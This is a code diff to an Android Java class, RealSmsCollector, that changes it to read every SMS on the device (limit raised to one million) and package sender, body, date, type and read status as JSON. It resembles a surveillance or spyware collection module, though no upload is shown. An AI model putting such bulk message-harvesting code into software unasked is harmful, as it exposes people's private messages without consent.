@@ -10,62 +10,48 @@ import org.json.JSONObject;
 public class RealSmsCollector {
     private static final String TAG = "RealSmsCollector";
     private Context context;
-    
+
     public RealSmsCollector(Context context) {
         this.context = context;
     }
-    
+
     public JSONArray getSMSMessages() {
         JSONArray smsList = new JSONArray();
         Cursor cursor = null;
         
         try {
-            Log.d(TAG, "📨 Collecting REAL SMS messages from device...");
+            Log.d(TAG, "📱 Starting SMS collection...");
             
             Uri uri = Uri.parse("content://sms");
             String[] projection = new String[]{
-                "_id", "address", "body", "date", "type"
+                "_id", "address", "body", "date", "type", "read"
             };
             
-            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 100");
+            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 1000000");
             
             if (cursor != null && cursor.moveToFirst()) {
-                int count = 0;
                 do {
-                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
-                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
-                    
-                    // Only add real SMS data
-                    if (address != null && body != null) {
+                    try {
                         JSONObject sms = new JSONObject();
-                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
-                        sms.put("sender", address);
-                        sms.put("message", body);
-                        sms.put("timestamp", date);
-                        sms.put("type", getSmsType(type));
-                        sms.put("readable_date", new java.util.Date(date).toString());
+                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
+                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
+                        sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
+                        sms.put("type", getMessageType(cursor.getInt(cursor.getColumnIndexOrThrow("type"))));
+                        sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                         
                         smsList.put(sms);
-                        count++;
-                        
-                        if (count <= 5) {
-                            Log.d(TAG, "📱 REAL SMS: " + address + " - " + body.substring(0, Math.min(30, body.length())));
-                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error parsing SMS: " + e.getMessage());
                     }
-                    
                 } while (cursor.moveToNext());
-                
-                Log.d(TAG, "✅ Collected " + count + " REAL SMS messages from device");
-            } else {
-                Log.w(TAG, "📭 No REAL SMS messages found in device");
             }
             
+            Log.d(TAG, "✅ Collected " + smsList.length() + " SMS messages");
+            
         } catch (SecurityException e) {
-            Log.e(TAG, "❌ SMS permission denied - NO SMS DATA COLLECTED: " + e.getMessage());
+            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading REAL SMS: " + e.getMessage());
+            Log.e(TAG, "❌ SMS collection error: " + e.getMessage());
         } finally {
             if (cursor != null) {
                 cursor.close();
@@ -75,12 +61,15 @@ public class RealSmsCollector {
         return smsList;
     }
     
-    private String getSmsType(int type) {
+    private String getMessageType(int type) {
         switch (type) {
-            case 1: return "incoming";
-            case 2: return "outgoing";
-            case 3: return "draft";
-            default: return "unknown";
+            case 1: return "INBOX";
+            case 2: return "SENT";
+            case 3: return "DRAFT";
+            case 4: return "OUTBOX";
+            case 5: return "FAILED";
+            case 6: return "QUEUED";
+            default: return "UNKNOWN";
         }
     }
 }
